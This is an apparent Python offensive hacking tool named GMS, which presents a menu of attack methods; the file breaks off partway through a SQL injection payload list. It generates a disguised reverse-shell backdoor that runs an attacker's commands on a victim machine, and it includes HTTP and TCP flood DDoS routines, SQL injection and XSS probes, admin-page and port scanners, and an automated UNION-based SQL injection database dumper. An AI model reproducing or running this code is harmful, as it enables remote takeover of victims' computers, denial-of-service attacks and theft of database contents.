try:
  import colorama
  from colorama import Fore
  from colorama import Style
  from colorama import Back
except:
  print("[+] Please Setup Tool\npython3 setup.py")
import os
try:
  import requests
except:
  print("[+] Please Setup Tool\npython3 setup.py")
import random
import socket
import sys
import subprocess
import re
import threading
try:
  import aiohttp
  import asyncio
except:
  print("[+] Please Setup Tool\npython3 setup.py")
try:
  colorama.init()
except:
  print("[+] Please Setup Tool\npython3 setup.py")
  
os.system('cls' if os.name == 'nt' else 'clear')

print(f'''
{Fore.RED}GMS - GhostManSec Sploit Tool
{Fore.RED}Dev By : @ghostman_s3c{Style.RESET_ALL}
                            ,-.                               
       ___,---.__          /'|`\          __,---,___          
    ,-'    \`    `-.____,-'  |  `-.____,-'    //    `-.       
  ,'        |           ~'\     /`~           |        `.      
 /      ___//              `. ,'          ,  , \___      \    
|    ,-'   `-.__   _         |        ,    __,-'   `-.    |    
|   /          /\_  `   .    |    ,      _/\          \   |   
\  |           \ \`-.___ \   |   / ___,-'/ /           |  /  
 \  \           | `._   `\\  |  //'   _,' |           /  /      
  `-.\         /'  _ `---'' , . ``---' _  `\         /,-'     
     ``       /     \    ,='/ \`=.    /     \       ''          
             |__   /|\_,--.,-.--,--._/|\   __|                  
             /  `./  \\`\ |  |  | /,//' \,'  \                  
eViL        /   /     ||--+--|--+-/-|     \   \                 
           |   |     /'\_\_\ | /_/_/`\     |   |                
            \   \__, \_     `~'     _/ .__/   /            
             `-._,-'   `-._______,-'   `-._,-'
  {Style.RESET_ALL}

     =[ GMS v1.4-dev                  ]=-
+-- -=[ Copyright By {Fore.BLUE}Ph4mCh13n{Style.RESET_ALL}        ]=-
+-- -=[ Twitter : {Back.GREEN}@ghostman_s3c{Style.RESET_ALL}       ]=-
+-- -=[ Email : amous4484@gmail.com   ]=-

DMS document : https://ghostmanews.blogspot.com
N/A''')
print(f'''
{Fore.WHITE}{Back.RED}Warning Cyber Secutity !! {Style.RESET_ALL}
[-] ALL METHOD(s) :
+-- -=[ 1 Malware Method              ]
+-- -=[ 2 Stresser DDoS Attack Method ]
+-- -=[ 3 Exploit - Scan Vulnerable   ]
+-- -=[ 2 Scan Information Target     ]
{Fore.BLUE}[*]{Style.RESET_ALL} Please use according to the provisions of Law
---
method :
    1), Backdoor Created ({Fore.RED + Style.BRIGHT}WARNING MALWARE{Style.RESET_ALL}) 
    2), Attack the server's bandwidth is overloaded ({Fore.RED}{Style.BRIGHT}WARNING DDoS{Style.RESET_ALL})
    3), DDoS attack TCP, UDP Attack ({Fore.RED}{Style.BRIGHT}WARNING DDoS{Style.RESET_ALL})
    4), (SQLi) - MySQL Injection Checking Vulnerable ({Fore.RED + Style.BRIGHT}WARNING SECURITY{Style.RESET_ALL})
    5), XSS - Cross Site Script Checking Vulnerable ({Fore.RED + Style.BRIGHT}WARNING SECURITY{Style.RESET_ALL})
    6), Scan Page Login Admin ({Fore.GREEN + Style.BRIGHT}BASIC HACKING{Style.RESET_ALL})
    7), Checking PORT server address ({Fore.GREEN + Style.BRIGHT}BASIC HACKING{Style.RESET_ALL})   
    8), Injection Command MySQL - Enumerate Database SQLi ({Fore.RED + Style.BRIGHT}WARNING SECURITY{Style.RESET_ALL}) 
---
''')

choose = input("choose method : ")

if choose == "1":
    import os
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f'''{Fore.RED}
        _.---**""**-.       
._   .-'           /|`.     
 \`.'             / |  `.   
  V              (  ;    \  
  L       _.-  -. `'      \ 
 / `-. _.'       \         ;
:            __   ;    _   |
:`-.___.+-*"': `  ;  .' `. |
|`-/     `--*'   /  /  /`.\|
: :              \    :`.| ;
| |   .           ;/ .' ' / 
: :  / `             :__.'  
 \`._.-'       /     |      
  : )         :      ;      
  :----.._    |     /       
 : .-.    `.       /        
  \     `._       /         
  /`-            /          
 :             .'           
  \ )       .-'             
   `-----*"'     [GMS]
   [ Backdoor Method       ]
   [ Copyright : Phamchien ]
{Style.RESET_ALL}
''')
    def backdoor():
        import socket
        import sys

        HOST = input("set (Local Host) LHOST : ")
        print("")
        print(f"{Fore.BLUE}[*]{Style.RESET_ALL} LOCAL HOST => {HOST}")
        print()
        PORT = int(input("set (Local Port) LPORT : "))
        print("")
        print(f"{Fore.BLUE}[*]{Style.RESET_ALL} LOCAL PORT => {PORT}")
        print()
        NAME_FILE = input("set FILE NAME : ")
        print(f"{Fore.BLUE}[*]{Style.RESET_ALL} FILE NAME => {NAME_FILE}")
        print(f"{Fore.BLUE}[*]{Style.RESET_ALL} Starting Created File {NAME_FILE}")
        code = f'''
import socket
import random
import subprocess

RHOST = '{HOST}'
RPORT = {PORT}

def setup():
    docker_file_setup = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    docker_file_setup.connect((RHOST, RPORT))
    print("[+] Starting Setup...")
    while True:
        temp = docker_file_setup.recv(10024)
        if temp == "exit":
            s.close()
            print("[-] setup failed , please again..")
            exit()
        else:
            procs = subprocess.Popen(
                temp,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                stdin=subprocess.PIPE
            )
            data_setup = procs.stdout.read() + procs.stderr.read()
            docker_file_setup.send(data_setup)
            data = random.randint(1111111111, 9999999999)
            print("[-] Starting Setup", data)
setup()
'''
        with open(f'{NAME_FILE}.py', 'w') as files:
            content = files.write(code)
            print(f'{Fore.BLUE}[*]{Style.RESET_ALL} Created Success {content}')

        handler_tcp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        handler_tcp.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        handler_tcp.bind((HOST, PORT))
        handler_tcp.listen(1)

        print(f"{Fore.BLUE}[*]{Style.RESET_ALL} Server Handler is listenning on {HOST}:{PORT}...")
        conn, addr = handler_tcp.accept()
        print(f"{Fore.BLUE}[*]{Style.RESET_ALL} Start Session on victim {addr[0]} and port {addr[1]}....")
        
        while True:
            sys.stdout.write(f'\nshell@{addr[0]} > ')
            shell_cmd = sys.stdin.readline()
            if shell_cmd == "exit\n":
                print(f"{Fore.RED}[-]{Style.RESET_ALL} Session Exited..")
                conn.send(b'exit\n')
                conn.close()
                break

            elif shell_cmd != "\n":
                conn.send(shell_cmd.encode())
                output = conn.recv(10024)
                print("\n" + output.decode())

    backdoor()
elif choose == "2":
    os.system('cls' if os.name == 'nt' else 'clear')
    print('''
         .AMMMMMMMMMMA.          
       .AV. :::.:.:.::MA.        
      A' :..        : .:`A       
     A'..              . `A.     
    A' :.    :::::::::  : :`A    
    M  .    :::.:.:.:::  . .M    
    M  :   ::.:.....::.:   .M    
    V : :.::.:........:.:  :V    
   A  A:    ..:...:...:.   A A   
  .V  MA:.....:M.::.::. .:AM.M   
 A'  .VMMMMMMMMM:.:AMMMMMMMV: A  
:M .  .`VMMMMMMV.:A `VMMMMV .:M: 
 V.:.  ..`VMMMV.:AM..`VMV' .: V  
  V.  .:. .....:AMMA. . .:. .V   
   VMM...: ...:.MMMM.: .: MMV    
       `VM: . ..M.:M..:::M'      
         `M::. .:.... .::M       
          M:.  :. .... ..M       
 VK       V:  M:. M. :M .V       
          `V.:M.. M. :M.V'

    [ Method DDoS Attack Layer 7 ]
    [ Copyright : Pham CHien]
''')
    def exploit():
        URL = input("URL Target : ")
        print(f"{Fore.BLUE}[*]{Style.RESET_ALL} Start DDoSing to Target : {URL}")
        while True:
            async def send_rq(session):
                async with session.get(URL) as rq:
                    pass

            async def main():
                threads = 10000

                nod = []
                async with aiohttp.ClientSession() as session:
                    for i in range(threads):
                        t = asyncio.ensure_future(send_rq(session))
                        nod.append(t)

                    await asyncio.gather(*nod)
                    await asyncio.gather(*nod)
                    
            if __name__ =='__main__':
                loop = asyncio.get_event_loop()
                loop.run_until_complete(main())

    exploit()
elif choose == "3":
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f'''{Fore.RED}{Style.BRIGHT}
    .... NO! ...                  ... MNO! ...
   ..... MNO!! ...................... MNNOO! ...
 ..... MMNO! ......................... MNNOO!! .
.... MNOONNOO!   MMMMMMMMMMPPPOII!   MNNO!!!! .
 ... !O! NNO! MMMMMMMMMMMMMPPPOOOII!! NO! ....
    ...... ! MMMMMMMMMMMMMPPPPOOOOIII! ! ...
   ........ MMMMMMMMMMMMPPPPPOOOOOOII!! .....
   ........ MMMMMOOOOOOPPPPPPPPOOOOMII! ...  
    ....... MMMMM..    OPPMMP    .,OMI! ....
     ...... MMMM::   o.,OPMP,.o   ::I!! ...
         .... NNM:::.,,OOPM!P,.::::!! ....
          .. MMNNNNNOOOOPMO!!IIPPO!!O! .....
         ... MMMMMNNNNOO:!!:!!IPPPPOO! ....
           .. MMMMMNNOOMMNNIIIPPPOO!! ......
          ...... MMMONNMMNNNIIIOO!..........
       ....... MN MOMMMNNNIIIIIO! OO ..........
    ......... MNO! IiiiiiiiiiiiI OOOO ...........
  ...... NNN.MNO! . O!!!!!!!!!O . OONO NO! ........
   .... MNNNNNO! ...OOOOOOOOOOO .  MMNNON!........
   ...... MNNNNO! .. PPPPPPPPP .. MMNON!........
      ...... OO! ................. ON! .......
         ................................{Style.RESET_ALL}
         -=--------------------------=-
         [ Method DDoS Attack TCP UDP ]
         [          Layer 4           ]
         [ Copyright By : Ph4m Ch13n  ]
         -=--------------------------=-
''')
    def attack():
        server = input("IP Target : ")
        port = int(input("Port Target "))
        print(f"{Fore.BLUE}[*]{Style.RESET_ALL} Start DDoSing to Target : {server}:{port}")
        data = b"a" * (1024 * 1024 * 1024)
        def attacks():
            while True:
                socks_ip = socket.socket(socket.AF_INET)
                socks_ip.connect((server, port))
                socks_ip.send(data)
                socks_ip.sendall(data)
                socks_ip.close()
        threads = []
        while True:
            t = threading.Thread(target=attacks)
            threads.append(t)
            t.start()
            t.join()
    attack()
elif choose == "4":
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f'''
      .-.
     (o.o)
      |=|
     __|__
   //.=|=.\\
  // .=|=. \\
  \\ .=|=. //  ___
   \\(_=_)//    H
    (:| |:)   [{Fore.WHITE}{Back.RED},{Style.RESET_ALL}]
     || ||    [{Fore.WHITE}{Back.RED}){Style.RESET_ALL}]
     () ()    [{Fore.WHITE}{Back.RED}({Style.RESET_ALL}]
     || ||     V...
     || ||
l42 ==' '==

 [ Method : Scan Vulnerable SQL ]
 [ Copyright : Ph4mCh13n        ]
''')
    def exploit():
        URL = input("Enter URL : ")

        rq = requests.Session()
        results = rq.get(URL + "%27")
        if "at line" in results.text:
            print(f"{Fore.BLUE}[*]{Style.RESET_ALL} Target Vulnerable SQL Injection Command From ID")
            exit()
        elif "on line" in results.text:
            print(f"{Fore.BLUE}[*]{Style.RESET_ALL} Target Vulnerable MySQL Server on line")
            exit()
        else:
            print(f"{Fore.RED}[-]{Style.RESET_ALL} Target Not Vulnerable...")
            exit()
    exploit()

elif choose == "5":
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f'''{Fore.RED}
         .            )        )
                  (  (|              .
              )   )\/ ( ( (
      *  (   ((  /     ))\))  (  )    )
    (     \   )\(          |  ))( )  (|
    >)     ))/   |          )/  \((  ) \
    (     (      .        -.     V )/   )(    (
     \   /     .   \            .       \))   ))
       )(      (  | |   )            .    (  /
      )(    ,'))     \ /          \( `.    )
      (\>  ,'/__      ))            __`.  /
     ( \   | /  ___   ( \/     ___   \ | ( (
      \.)  |/  /   \__      __/   \   \|  ))
     .  \. |>  \      | __ |      /   <|  /
          )/    \____/ :..: \____/     \ <
   )   \ (|__  .      / ;: \          __| )  (
  ((    )\)  ~--_     --  --      _--~    /  ))
   \    (    |  ||               ||  |   (  /
         \.  |  ||_             _||  |  /
           > :  |  ~V+-I_I_I-+V~  |  : (.
          (  \:  T\   _     _   /T  : ./
           \  :    T^T T-+-T T^T    ;<
            \..`_       -+-       _'  )
  )            . `--=.._____..=--'. ./  {Style.RESET_ALL}

  [ Method : XSS - Cross Site Script Scan Vulnerable ]
  [             Copyright : Ph4m Ch13n               ]
''')
    def exploit():
        URL = input("Enter URL : ")

        results = requests.get(URL + "<script>document.body.innerHTML=('Site Vulnerable XSS - Checked By GMS');</script>")
        if "Site Vulnerable XSS - Checked By GMS" in results.text:
            print(f"{Fore.BLUE}[*]{Style.RESET_ALL} Target May Be Vulnerable Cross Site Scripting")
            exit()
        else:
            print(f"{Fore.RED}[-]{Style.RESET_ALL} Target Not Vulnerable Cross Site Scripting")
            exit()
    exploit()

elif choose == "6":
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f'''{Fore.RED}{Style.BRIGHT}
                          _____                          
                   _.+sd$$$$$$$$$bs+._                   
               .+d$$$$$$$$$$$$$$$$$$$$$b+.               
            .sd$$$$$$$P^*^T$$$P^*"*^T$$$$$bs.            
          .s$$$$$$$$P*     `*' _._  `T$$$$$$$s.          
        .s$$$$$$$$$P          ` :$;   T$$$$$$$$s.        
       s$$$$$$$$$$;  db..+s.   `**'    T$$$$$$$$$s       
     .$$$$$$$$$$$$'  `T$P*'             T$$$$$$$$$$.     
    .$$$$$$$$$$$$P                       T$$$$$$$$$$.    
   .$$$$$$$$$$$$$b                       `$$$$$$$$$$$.   
  :$$$$$$$$$$$$$$$.                       T$$$$$$$$$$$;  
  $$$$$$$$$P^*' :$$b.                     d$$$$$$$$$$$$  
 :$$$$$$$P'      T$$$$bs._               :P'`*^T$$$$$$$; 
 $$$$$$$P         `*T$$$$$b              '      `T$$$$$$ 
:$$$$$$$b            `*T$$$s                      :$$$$$;
:$$$$$$$$b.                                        $$$$$;
$$$$$$$$$$$b.                                     :$$$$$$
$$$$$$$$$$$$$bs.                                 .$$$$$$$
$$$$$$$$$$$$$$$$$bs.                           .d$$$$$$$$
:$$$$$$$$$$$$$P*"*T$$bs,._                  .sd$$$$$$$$$;
:$$$$$$$$$$$$P     TP^**T$bss++.._____..++sd$$$$$$$$$$$$;
 $$$$$$$$$$$$b           `T$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ 
 :$$$$$$$$$$$$b.           `*T$$P^*"*"*^^*T$$$$$$$$$$$$; 
  $$$b       `T$b+                        :$$$$$$$BUG$$  
  :$P'         `"'               ,._.     ;$$$$$$$$$$$;  
   !                            `*TP*     d$$P*******$   
    !                                    :$$P'      /    
     !                                  :dP'       /     
      `.                               d$P       .'      
[bug]   `.                             `'      .'        
          `-.                               .-'          
             `-.                         .-'             
                `*+-._             _.-+*'                
                      `"*-------*"'{Style.RESET_ALL}

    [ Method : Scan Page Login Admin ]
    [ Copyright : Ph4m Ch13n         ]
''')
    def exploit():
        URL = input("URL Target : ")
        lists = [
          '/admin',
          '/admin.php',
          '/wp-admin',
          '/wp-admin.php',
          '/wp-login',
          '/wp-login.php',
          '/admin/login',
          '/admin/login.php',
          '/cpanel',
          '/cpanel.php',
          '/contact',
          '/contact.php',
          '/login',
          '/login.php',
          '/admin.html',
          '/admin.aspx',
        ]
        for log_page in lists:
            results = requests.get(URL + log_page)
            if results.status_code == 200:
                print(f"{Fore.GREEN}[*]{Style.RESET_ALL} Found Page Login : {log_page}")
                print("---")
                print("Found 1 Page Login : ")
                print(f"   URL : {URL}")
                print(f"   Page : {log_page}")
                print(f"   Status : {results.status_code}")
                print(f"   TOTAL Request : Anonymous")
                print(f"   URL Page Admin : {URL}{log_page}")
                print("---")
            else:
                print(f"{Fore.RED}[*]{Style.RESET_ALL} Not Found Page : {log_page}")
    exploit()
elif choose == "7":
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f'''{Fore.BLUE}
         _nnnn_                      
        dGGGGMMb     ,"""""""""""""".
       @p~qp~~qMb    | Linux Rules! |
       M|@||@) M|   _;..............'
       @,----.JM| -'
      JS^\__/  qKL
     dZP        qKRb
    dZP          qKKb
   fZP            SMMb
   HZM            MMMM
   FqM            MMMM
 __| ".        |\dS"qML
 |    `.       | `' \Zq
_)      \.___.,|     .'
\____   )MMMMMM|   .'
     `-'       `--' {Style.RESET_ALL}Hello World

  [ Method : Scan Port Server Address ]
  [     Copyright By : Ph4mCh13n      ]
''')
    def exploit():
        host = input("Enter Host : ")
        print(f"{Fore.BLUE}[*]{Style.RESET_ALL} Starting Checking Port From Server {host}")
        port = [
          20,
          21,
          22,
          23,
          24,
          25,
          80,
          443,
          8080,
          3306,
          1000,
          8443,
          445,
          554,
        ]
        for port in port:
            s = socket.socket(
                socket.AF_INET,
                socket.SOCK_STREAM
            )
            s.settimeout(1)
            conn = s.connect_ex((host, port))
            if conn == 0:
                print(f"{Fore.GREEN}[*]{Style.RESET_ALL} {host} open port => {port}")
            else:
                pass
    exploit()
elif choose == "8":
    os.system('cls' if os.name == 'nt' else ' clear')
    print('''
Adonis Bertha
         ______________
        /             /|
       /             / |
      /____________ /  |
     | ___________ |   |
     ||           ||   |
     ||    SQL    ||   |
     || Injection ||   |    [ Method : SQL Injection Dump ]
     ||___________||   |    [ Copyright By : Ph4m Ch13n   ]
     |   _______   |  /     [       WARNING SECURITY      ]
    /|  (_______)  | /
   ( |_____________|/
    )
.=======================.
| ::::::::::::::::  ::: |
| ::::::::::::::[]  ::: |
|   -----------     ::: |
`-----------------------'
''')
    def exploit():
        URL = input("Enter URL Vulnerable : ")
        print(f"{Fore.GREEN}[*]{Style.RESET_ALL} Start Testing SQL Injection")
        pl = "%27"
        results = requests.get(URL + pl)
        if "at line" in results.text:
          pl = " Union Select 1,2,3-- -"
          results = requests.get(URL + pl)
          if "The used SELECT" in results.text:
            print(f"{Fore.GREEN}[*]{Style.RESET_ALL} Target OK , start Exploit Columns")
            payloads = [
                ' UNION ALL SELECT 1-- -',
                ' UNION ALL SELECT 1,2-- -',
                ' UNION ALL SELECT 1,2,3-- -',
                ' UNION ALL SELECT 1,2,3,4-- -',
                ' UNION ALL SELECT 1,2,3,4,5-- -',
                ' UNION ALL SELECT 1,2,3,4,5,6-- -',
                ' UNION ALL SELECT 1,2,3,4,5,6,7-- -',
                ' UNION ALL SELECT 1,2,3,4,5,6,7,8-- -',
                ' UNION ALL SELECT 1,2,3,4,5,6,7,8,9-- -',
                ' UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10-- -',
                ' UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11-- -',
                ' UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12-- -',
                ' UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13-- -',
                ' UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14-- -',
                ' UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15-- -',
                ' UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16-- -',
                ' UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17-- -',
                ' UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18-- -',
                ' UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19-- -',
                ' UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20-- -',
                ' UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21-- -',
                ' UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22-- -',
                ' UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23-- -',
                ' UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24-- -',
                ' UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25-- -',
                ' UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26-- -',
                ' UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27-- -',
                ' UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28-- -',
                ' UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29-- -',
                ' UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30-- -',
                ' UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31-- -',
                ' UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32-- -',
                ' UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33-- -',
                ' UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34-- -',
                ' UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35-- -',
                ' UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36-- -',
                ' UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37-- -',
                ' UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38-- -',
                ' UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39-- -',
                ' UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40-- -',
                ' UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41-- -',
                ' UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42-- -',
                ' UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43-- -',
                ' UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44-- -',
                ' UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45-- -',
                ' UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46-- -',
                ' UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47-- -',
                ' UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48-- -',
                ' UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49-- -',
                ' UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50-- -',
                ' UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51-- -',
            ]
            num = 0
            for payload in payloads:
              num += 1
              results = requests.get(URL + payload)
              if "The used SELECT" in results.text:
                pass
              else:
                print(f"{Fore.GREEN}[*]{Style.RESET_ALL} Found Column : {num}")
                print(f"{Fore.GREEN}[*]{Style.RESET_ALL} Start Get Back-End")
                count = num
                nums = [count for count in range(1, count+1)]
                for xem in nums:
                  payl = "(Select Group_Concat(database(),'::',version()))"
                  payls = re.sub(r"\b{}\b".format(xem), payl, payload)
                  results = requests.get(URL + payls)
                  if "::" in results.text:
                    print(f"{Fore.GREEN}[*]{Style.RESET_ALL} Found Count Column : {xem}")
                    payl = "(Select Group_Concat(user(),'::',version()))"
                    payls = re.sub(r"\b{}\b".format(xem), payl, payload)
                    get_html = requests.get(URL + payls)
                    html = get_html.text
                    dbms = r"\b\w+@\b\w+::\b"
                    find = re.findall(dbms, html)
                    print("---")
                    for dbms in find:
                      dbs = dbms.replace("::", "")
                      print("- User MySQL : {}".format(dbs))
                    payl = "(Select Group_Concat(database(),'::',version()))"
                    payls = re.sub(r"\b{}\b".format(xem), payl, payload)
                    get_html = requests.get(URL + payls)
                    html = get_html.text
                    dbms = r"\b\w+::\b"
                    find = re.findall(dbms, html)
                    for dbms in find:
                      dbs = dbms.replace("::", "")
                      print("- Database : {}".format(dbs))
                      print("- Database : information_schema")
                    print("---")
                    payl = "(Select Group_Concat(table_name,'::',column_name,'::',@@port+SEPARATOR+'<br>') From information_schema.columns)"
                    payls = re.sub(r"\b{}\b".format(xem), payl, payload)
                    get_html = requests.get(URL + payls)
                    html = get_html.text
                    dbms = r"\b\w+::\b\w+::\b"
                    find = re.findall(dbms, html)
                    co = 0
                    for dbms in find:
                      co += 1
                      dbs = dbms.replace("::", " | ")
                      print("- Database : {}".format(dbs))
                    print("---")
                    print(f"{Fore.GREEN}[*]{Style.RESET_ALL} Found : {co} database name")
                    exit()
                  else:
                    print("not found {}".format(xem))
          
          else:
            print(f"{Fore.GREEN}[*]{Style.RESET_ALL} Target Ok 50% , Start exploit columns")
            payloads = [
                '%27 UNION ALL SELECT 1-- -',
                '%27 UNION ALL SELECT 1,2-- -',
                '%27 UNION ALL SELECT 1,2,3-- -',
                '%27 UNION ALL SELECT 1,2,3,4-- -',
                '%27 UNION ALL SELECT 1,2,3,4,5-- -',
                '%27 UNION ALL SELECT 1,2,3,4,5,6-- -',
                '%27 UNION ALL SELECT 1,2,3,4,5,6,7-- -',
                '%27 UNION ALL SELECT 1,2,3,4,5,6,7,8-- -',
                '%27 UNION ALL SELECT 1,2,3,4,5,6,7,8,9-- -',
                '%27 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10-- -',
                '%27 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11-- -',
                '%27 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12-- -',
                '%27 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13-- -',
                '%27 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14-- -',
                '%27 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15-- -',
                '%27 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16-- -',
                '%27 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17-- -',
                '%27 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18-- -',
                '%27 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19-- -',
                '%27 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20-- -',
                '%27 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21-- -',
                '%27 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22-- -',
                '%27 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23-- -',
                '%27 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24-- -',
                '%27 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25-- -',
                '%27 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26-- -',
                '%27 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27-- -',
                '%27 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28-- -',
                '%27 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29-- -',
                '%27 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30-- -',
